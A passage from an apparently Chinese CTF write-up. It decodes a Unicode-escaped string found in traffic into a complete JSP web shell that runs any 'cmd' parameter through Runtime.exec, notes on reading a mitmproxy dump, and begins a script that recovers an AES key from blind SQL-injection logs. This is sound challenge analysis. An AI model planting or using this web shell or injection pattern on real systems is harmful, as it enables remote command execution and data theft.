020\\u0020\\u0020\\u0020\\u0020\\u0069\\u0066\\u0020\\u0028\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u0050\\u0061\\u0072\\u0061\\u006d\\u0065\\u0074\\u0065\\u0072\\u0028\\u0022\\u0063\\u006d\\u0064\\u0022\\u0029\\u0020\\u0021\\u003d\\u0020\\u006e\\u0075\\u006c\\u006c\\u0029\\u0020\\u007b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u006f\\u0075\\u0074\\u002e\\u0070\\u0072\\u0069\\u006e\\u0074\\u006c\\u006e\\u0028\\u0022\\u0043\\u006f\\u006d\\u006d\\u0061\\u006e\\u0064\\u003a\\u0020\\u0022\\u0020\\u002b\\u0020\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u0050\\u0061\\u0072\\u0061\\u006d\\u0065\\u0074\\u0065\\u0072\\u0028\\u0022\\u0063\\u006d\\u0064\\u0022\\u0029\\u0020\\u002b\\u0020\\u0022\\u003c\\u0042\\u0052\\u003e\\u0022\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0020\\u0070\\u0020\\u003d\\u0020\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u002e\\u0067\\u0065\\u0074\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0028\\u0029\\u002e\\u0065\\u0078\\u0065\\u0063\\u0028\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u0050\\u0061\\u0072\\u0061\\u006d\\u0065\\u0074\\u0065\\u0072\\u0028\\u0022\\u0063\\u006d\\u0064\\u0022\\u0029\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u004f\\u0075\\u0074\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u006f\\u0073\\u0020\\u003d\\u0020\\u0070\\u002e\\u0067\\u0065\\u0074\\u004f\\u0075\\u0074\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0028\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0069\\u006e\\u0020\\u003d\\u0020\\u0070\\u002e\\u0067\\u0065\\u0074\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0028\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0044\\u0061\\u0074\\u0061\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0064\\u0069\\u0073\\u0020\\u003d\\u0020\\u006e\\u0065\\u0077\\u0020\\u0044\\u0061\\u0074\\u0061\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0028\\u0069\\u006e\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u0064\\u0069\\u0073\\u0072\\u0020\\u003d\\u0020\\u0064\\u0069\\u0073\\u002e\\u0072\\u0065\\u0061\\u0064\\u004c\\u0069\\u006e\\u0065\\u0028\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0077\\u0068\\u0069\\u006c\\u0065\\u0020\\u0028\\u0020\\u0064\\u0069\\u0073\\u0072\\u0020\\u0021\\u003d\\u0020\\u006e\\u0075\\u006c\\u006c\\u0020\\u0029\\u0020\\u007b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u006f\\u0075\\u0074\\u002e\\u0070\\u0072\\u0069\\u006e\\u0074\\u006c\\u006e\\u0028\\u0064\\u0069\\u0073\\u0072\\u0029\\u003b\\u0020\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0064\\u0069\\u0073\\u0072\\u0020\\u003d\\u0020\\u0064\\u0069\\u0073\\u002e\\u0072\\u0065\\u0061\\u0064\\u004c\\u0069\\u006e\\u0065\\u0028\\u0029\\u003b\\u0020\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u007d\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u007d\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0025\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0070\\u0072\\u0065\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0062\\u006f\\u0064\\u0079\\u003e\\u000a\\u003c\\u002f\\u0068\\u0074\\u006d\\u006c\\u003e\\u000a\&quot;)##   </span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_unicode</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解码Unicode转义序列&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 替换双反斜杠为单反斜杠</span></span><br><span class="line">    text = text.replace(<span class="string">&#x27;\\\\&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解码Unicode序列</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode_match</span>(<span class="params"><span class="keyword">match</span></span>):</span><br><span class="line">        hex_str = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="built_in">int</span>(hex_str, <span class="number">16</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 匹配各种Unicode格式</span></span><br><span class="line">    result = re.sub(<span class="string">r&#x27;\\u([0-9a-fA-F]&#123;4&#125;)&#x27;</span>, decode_match, text)</span><br><span class="line">    result = re.sub(<span class="string">r&#x27;\\U([0-9a-fA-F]&#123;8&#125;)&#x27;</span>, decode_match, result)</span><br><span class="line">    result = re.sub(<span class="string">r&#x27;\\x([0-9a-fA-F]&#123;2&#125;)&#x27;</span>, decode_match, result)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;解码Unicode转义序列&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 修改参数定义，允许多个参数合并</span></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;text&#x27;</span>, nargs=<span class="string">&#x27;*&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;要解码的文本（可多部分）&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="string">&#x27;--file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;从文件读取文本&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--save&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;保存到ascii.txt&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;指定输出文件名&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 获取输入文本</span></span><br><span class="line">    input_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> args.file:</span><br><span class="line">        <span class="comment"># 从文件读取</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(args.file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                input_text = f.read()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;读取文件失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">elif</span> args.text:</span><br><span class="line">        <span class="comment"># 将命令行多个部分合并</span></span><br><span class="line">        input_text = <span class="string">&quot; &quot;</span>.join(args.text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 从标准输入读取</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入文本（Ctrl+Z结束输入）：&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            input_text = sys.stdin.read()</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> input_text.strip():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;错误：没有输入文本&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解码文本</span></span><br><span class="line">    decoded = decode_unicode(input_text)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 输出结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解码结果：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">    <span class="built_in">print</span>(decoded)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 保存文件</span></span><br><span class="line">    <span class="keyword">if</span> args.save <span class="keyword">or</span> args.output:</span><br><span class="line">        filename = args.output <span class="keyword">if</span> args.output <span class="keyword">else</span> <span class="string">&quot;ascii.txt&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(decoded)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;✓ 已保存到: <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;✗ 保存失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Rekjo\Desktop\misc\useful_scripts&gt; python unicode.py <span class="string">&quot;<span class="variable">$logger</span>.warn(\&quot;</span>\\u003c\\u0025\\u0040\\u0020\\u0070\\u0061\\u0067\\u0065\\u0020\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u003d\\u0022\\u006a\\u0061\\u0076\\u0061\\u002e\\u0075\\u0074\\u0069\\u006c\\u002e\\u002a\\u002c\\u006a\\u0061\\u0076\\u0061\\u002e\\u0069\\u006f\\u002e\\u002a\\u0022\\u0025\\u003e\\u000a\\u003c\\u0068\\u0074\\u006d\\u006c\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u0062\\u006f\\u0064\\u0079\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0066\\u006f\\u0072\\u006d\\u0020\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064\\u003d\\u0022\\u0067\\u0065\\u0074\\u0022\\u003e\\u000a\\u0009\\u0009\\u003c\\u0069\\u006e\\u0070\\u0075\\u0074\\u0020\\u0074\\u0079\\u0070\\u0065\\u003d\\u0022\\u0074\\u0065\\u0078\\u0074\\u0022\\u0020\\u006e\\u0061\\u006d\\u0065\\u003d\\u0022\\u0063\\u006d\\u0064\\u0022\\u0020\\u0076\\u0061\\u006c\\u0075\\u0065\\u003d\\u0022\\u0066\\u006c\\u0061\\u0067\\u007b\\u0035\\u0037\\u0033\\u0038\\u0039\\u0030\\u0038\\u0034\\u0037\\u0039\\u0030\\u0031\\u0038\\u0034\\u0037\\u0039\\u0038\\u0031\\u0032\\u0037\\u0039\\u0030\\u0038\\u007d\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0069\\u006e\\u0070\\u0075\\u0074\\u0020\\u0074\\u0079\\u0070\\u0065\\u003d\\u0022\\u0073\\u0075\\u0062\\u006d\\u0069\\u0074\\u0022\\u0020\\u0076\\u0061\\u006c\\u0075\\u0065\\u003d\\u0022\\u0053\\u0065\\u006e\\u0064\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0066\\u006f\\u0072\\u006d\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u0070\\u0072\\u0065\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0025\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0069\\u0066\\u0020\\u0028\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u0050\\u0061\\u0072\\u0061\\u006d\\u0065\\u0074\\u0065\\u0072\\u0028\\u0022\\u0063\\u006d\\u0064\\u0022\\u0029\\u0020\\u0021\\u003d\\u0020\\u006e\\u0075\\u006c\\u006c\\u0029\\u0020\\u007b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u006f\\u0075\\u0074\\u002e\\u0070\\u0072\\u0069\\u006e\\u0074\\u006c\\u006e\\u0028\\u0022\\u0043\\u006f\\u006d\\u006d\\u0061\\u006e\\u0064\\u003a\\u0020\\u0022\\u0020\\u002b\\u0020\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u0050\\u0061\\u0072\\u0061\\u006d\\u0065\\u0074\\u0065\\u0072\\u0028\\u0022\\u0063\\u006d\\u0064\\u0022\\u0029\\u0020\\u002b\\u0020\\u0022\\u003c\\u0042\\u0052\\u003e\\u0022\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0020\\u0070\\u0020\\u003d\\u0020\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u002e\\u0067\\u0065\\u0074\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0028\\u0029\\u002e\\u0065\\u0078\\u0065\\u0063\\u0028\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u0050\\u0061\\u0072\\u0061\\u006d\\u0065\\u0074\\u0065\\u0072\\u0028\\u0022\\u0063\\u006d\\u0064\\u0022\\u0029\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u004f\\u0075\\u0074\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u006f\\u0073\\u0020\\u003d\\u0020\\u0070\\u002e\\u0067\\u0065\\u0074\\u004f\\u0075\\u0074\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0028\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0069\\u006e\\u0020\\u003d\\u0020\\u0070\\u002e\\u0067\\u0065\\u0074\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0028\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0044\\u0061\\u0074\\u0061\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0064\\u0069\\u0073\\u0020\\u003d\\u0020\\u006e\\u0065\\u0077\\u0020\\u0044\\u0061\\u0074\\u0061\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0028\\u0069\\u006e\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u0064\\u0069\\u0073\\u0072\\u0020\\u003d\\u0020\\u0064\\u0069\\u0073\\u002e\\u0072\\u0065\\u0061\\u0064\\u004c\\u0069\\u006e\\u0065\\u0028\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0077\\u0068\\u0069\\u006c\\u0065\\u0020\\u0028\\u0020\\u0064\\u0069\\u0073\\u0072\\u0020\\u0021\\u003d\\u0020\\u006e\\u0075\\u006c\\u006c\\u0020\\u0029\\u0020\\u007b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u006f\\u0075\\u0074\\u002e\\u0070\\u0072\\u0069\\u006e\\u0074\\u006c\\u006e\\u0028\\u0064\\u0069\\u0073\\u0072\\u0029\\u003b\\u0020\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0064\\u0069\\u0073\\u0072\\u0020\\u003d\\u0020\\u0064\\u0069\\u0073\\u002e\\u0072\\u0065\\u0061\\u0064\\u004c\\u0069\\u006e\\u0065\\u0028\\u0029\\u003b\\u0020\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u007d\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u007d\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0025\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0070\\u0072\\u0065\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0062\\u006f\\u0064\\u0079\\u003e\\u000a\\u003c\\u002f\\u0068\\u0074\\u006d\\u006c\\u003e\\u000a\<span class="string">&quot;)##&quot;</span></span><br><span class="line">============================================================</span><br><span class="line">解码结果：</span><br><span class="line">============================================================</span><br><span class="line">.warn(\ &lt;%<span class="selector-tag">@</span> page import=<span class="string">&quot;java.util.*,java.io.*&quot;</span>%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">                &lt;input <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;cmd&quot;</span> value=<span class="string">&quot;flag&#123;57389084790184798127908&#125;&quot;</span>&gt;</span><br><span class="line">            &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Send&quot;</span>&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;pre&gt;</span><br><span class="line">        &lt;%</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != null) &#123;</span><br><span class="line">            out.println(<span class="string">&quot;Command: &quot;</span> + request.getParameter(<span class="string">&quot;cmd&quot;</span>) + <span class="string">&quot;&lt;BR&gt;&quot;</span>);</span><br><span class="line">            <span class="keyword">Process</span> p = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">            OutputStream os = p.getOutputStream();</span><br><span class="line">            InputStream <span class="keyword">in</span> = p.getInputStream();</span><br><span class="line">            DataInputStream dis = new DataInputStream(<span class="keyword">in</span>);</span><br><span class="line">            String disr = dis.readLine();</span><br><span class="line">            <span class="keyword">while</span> ( disr != null ) &#123;</span><br><span class="line">                out.println(disr);</span><br><span class="line">                disr = dis.readLine();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        %&gt;</span><br><span class="line">    &lt;/pre&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">\)<span class="comment">##</span></span><br><span class="line">============================================================</span><br></pre></td></tr></table></figure>
<p><strong>flag{57389084790184798127908}</strong></p>
<p><strong>注：</strong>本题的附件不能用wireshark打开，但有个工具值得注意</p>
<p>根据文件名 443.this.is.mitm.file（暗示端口 443 HTTPS 流量被中间人拦截），这通常是工具 <strong>mitmproxy</strong> 保存的流量转储文件（Flow Dump）。</p>
<p>因为这是“中间人攻击”（MITM）截获的流量，<strong>里面的 HTTPS 流量已经是解密状态</strong>。可以通过以下方式来分析：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install mitmproxy <span class="comment">##kali linux</span></span><br><span class="line">mitmweb -n -r 443.this.is.mitm.file</span><br></pre></td></tr></table></figure>
<p>响应的网页可以在浏览器打开。此工具也可进行类似于wireshark的功能，如过滤、追踪等。</p>
<ul>
<li>EZSqli</li>
</ul>
<blockquote>
<p>简单sqli盲注分析, 但是AES加密</p>
<p>提交flag时把<code>flag{*}</code>替换为<code>CBCTF{*}</code></p>
</blockquote>
<p>notepad看看，里面比较长的若干行还是很醒目的，明显注入了aes_key和iv值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_aes_key_from_blind_injection</span>(<span class="params">logs</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 存储每个位置的成功ASCII值</span></span><br><span class="line">    positions = &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> log <span class="keyword">in</span> logs:</span><br><span class="line">        <span class="comment"># 提取位置和ASCII值</span></span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">r&#x27;ASCII\(SUBSTRING\(\(SELECT aes_key FROM sys_conf\),(\d+),1\)\)=\&#x27;(\d+)\&#x27;&#x27;</span>, log)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            pos = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">            ascii_val = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>))</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 检查响应大小 - 1280表示成功，100表示失败</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;&quot; 200 1280&#x27;</span> <span class="keyword">in</span> log:</span><br><span class="line">                positions[pos] = ascii_val</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 按位置排序并转换为字符</span></span><br><span class="line">    aes_key = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">sorted</span>(positions.keys()):</span><br><span class="line">        ascii_val = positions[pos]</span><br><span class="line">        aes_key += <span class="built_in">chr</span>(ascii_val)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> aes_key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 